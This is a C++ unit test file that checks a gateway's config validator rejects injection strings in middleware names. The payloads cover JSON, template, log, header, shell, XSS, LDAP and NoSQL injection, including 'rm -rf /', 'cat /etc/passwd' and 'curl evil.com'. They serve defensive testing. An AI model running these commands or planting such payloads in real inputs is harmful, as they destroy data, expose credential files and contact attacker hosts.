/*
 * Copyright 2025 Titan Contributors
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

// Injection Attack Tests
// Tests for JSON, template, log, header, command injection prevention

#include <catch2/catch_test_macros.hpp>

#include "../../src/control/config.hpp"
#include "../../src/control/config_validator.hpp"

using namespace titan::control;

// ============================================================================
// Test 1: JSON/YAML Injection
// ============================================================================

TEST_CASE("JSON quote escaping attack", "[injection][security]") {
    Config config;

    // Attempt to break out of JSON string with quotes
    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth\": {\"admin\": true}, \"fake");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (contains quotes and colons)
    REQUIRE_FALSE(result.valid);

    bool found_injection_error = false;
    for (const auto& error : result.errors) {
        if (error.find("Invalid character") != std::string::npos) {
            found_injection_error = true;
            break;
        }
    }
    REQUIRE(found_injection_error);
}

TEST_CASE("JSON structure injection with braces", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("middleware{malicious:data}");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (braces not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("JSON array injection with brackets", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("middleware[0]");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (brackets not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("YAML comment injection", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth # bypass: true");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (hash and space not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("JSON null byte injection in config", "[injection][security]") {
    Config config;

    std::string name_with_null = "auth";
    name_with_null += '\0';
    name_with_null += "bypass";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(name_with_null);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (null byte not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Config file manipulation via newline", "[injection][security]") {
    Config config;

    std::string malicious = "auth\nmalicious_key: malicious_value";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (newline not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Escaped quote injection attempt", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth\\\"bypass\\\"");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (backslash and quotes not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Unicode escape injection (JSON)", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth\\u0000bypass");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (backslash not allowed)
    REQUIRE_FALSE(result.valid);
}

// ============================================================================
// Test 2: Template Injection
// ============================================================================

TEST_CASE("Server-Side Template Injection (SSTI) - Jinja2 style", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("{{config.items()}}");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (braces, dots, parens not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("SSTI - Freemarker style", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("${7*7}");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (special chars not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Template variable expansion", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth_$USER");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (dollar sign not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Format string attack", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth_%s_%x");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (percent not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Template expression injection", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth<%= system('id') %>");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (special chars not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("EL injection (Java Expression Language)", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("${applicationScope}");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (special chars not allowed)
    REQUIRE_FALSE(result.valid);
}

// ============================================================================
// Test 3: Log Injection
// ============================================================================

TEST_CASE("Log injection with CRLF", "[injection][security]") {
    Config config;

    std::string malicious = "auth\r\nFAKE LOG: Admin login successful";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (CRLF not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Log forging with newline", "[injection][security]") {
    Config config;

    std::string malicious = "auth\nERROR: Authentication bypassed";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (newline not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Log pollution with control characters", "[injection][security]") {
    Config config;

    std::string malicious = "auth\x1b[31mFAKE ERROR\x1b[0m";  // ANSI escape codes

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (control chars not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Log injection with tab character", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth\tbypass");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (tab not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Multi-line log injection", "[injection][security]") {
    Config config;

    std::string malicious = "auth\n[INFO] User admin logged in\n[WARN] Security disabled";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (newlines not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Syslog injection attack", "[injection][security]") {
    Config config;

    std::string malicious = "auth<133>FAKE PRIORITY MESSAGE";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (angle brackets not allowed)
    REQUIRE_FALSE(result.valid);
}

// ============================================================================
// Test 4: HTTP Header Injection
// ============================================================================

TEST_CASE("HTTP header injection via CRLF", "[injection][security]") {
    Config config;

    std::string malicious = "auth\r\nX-Admin: true";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (CRLF not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Response splitting attack", "[injection][security]") {
    Config config;

    std::string malicious = "auth\r\n\r\n<script>alert('XSS')</script>";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (CRLF and special chars not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Header value injection with colon", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("X-Custom-Header: malicious");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (colon and space not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Multiple header injection", "[injection][security]") {
    Config config;

    std::string malicious = "auth\r\nX-Admin: true\r\nX-Role: admin";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (CRLF not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Header folding attack", "[injection][security]") {
    Config config;

    std::string malicious = "auth\r\n Set-Cookie: session=hijacked";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(malicious);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (CRLF and space not allowed)
    REQUIRE_FALSE(result.valid);
}

// ============================================================================
// Test 5: Command Injection
// ============================================================================

TEST_CASE("Shell command injection with semicolon", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth; rm -rf /");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (semicolon and space not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Command injection with pipe", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth | cat /etc/passwd");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (pipe and space not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Backtick command substitution", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth`whoami`");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (backtick not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Command injection with AND operator", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth && curl evil.com");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (ampersand and space not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Subshell command injection", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth$(whoami)");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (dollar sign and parens not allowed)
    REQUIRE_FALSE(result.valid);
}

// ============================================================================
// Test 6: Additional Injection Vectors
// ============================================================================

TEST_CASE("XSS injection in middleware name", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("<script>alert('XSS')</script>");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (angle brackets not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("LDAP injection attempt", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth*)(uid=*))(|(uid=*");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (special chars not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("NoSQL injection attempt", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth'; db.dropDatabase(); //");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (special chars not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("XML injection attempt", "[injection][security]") {
    Config config;

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth</middleware><admin>true</admin>");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (angle brackets not allowed)
    REQUIRE_FALSE(result.valid);
}

TEST_CASE("Regex denial of service (ReDoS) pattern", "[injection][security]") {
    Config config;

    // Pattern that could cause catastrophic backtracking if used in regex
    std::string redos_pattern = "aaaaaaaaaaaaaaaaaaaaaaaa!";

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back(redos_pattern);
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    // Should be rejected (exclamation mark not allowed)
    REQUIRE_FALSE(result.valid);
}

// ============================================================================
// Test 7: Legitimate Patterns (Should Pass)
// ============================================================================

TEST_CASE("Legitimate middleware name with underscores", "[injection][security]") {
    Config config;

    config.rate_limits["jwt_auth_v2"] = RateLimitConfig{};

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("jwt_auth_v2");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    REQUIRE(result.valid);
}

TEST_CASE("Legitimate middleware name with hyphens", "[injection][security]") {
    Config config;

    config.rate_limits["rate-limit-strict"] = RateLimitConfig{};

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("rate-limit-strict");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    REQUIRE(result.valid);
}

TEST_CASE("Legitimate middleware name with numbers", "[injection][security]") {
    Config config;

    config.rate_limits["auth2fa"] = RateLimitConfig{};

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("auth2fa");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    REQUIRE(result.valid);
}

TEST_CASE("Legitimate middleware name mixed case", "[injection][security]") {
    Config config;

    config.rate_limits["JwtAuthMiddleware"] = RateLimitConfig{};

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("JwtAuthMiddleware");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    REQUIRE(result.valid);
}

TEST_CASE("Legitimate middleware name with all allowed chars", "[injection][security]") {
    Config config;

    config.rate_limits["Auth_V2-JWT-2025"] = RateLimitConfig{};

    RouteConfig route;
    route.path = "/api/test";
    route.middleware.push_back("Auth_V2-JWT-2025");
    config.routes.push_back(route);

    ConfigValidator validator;
    auto result = validator.validate(config);

    REQUIRE(result.valid);
}
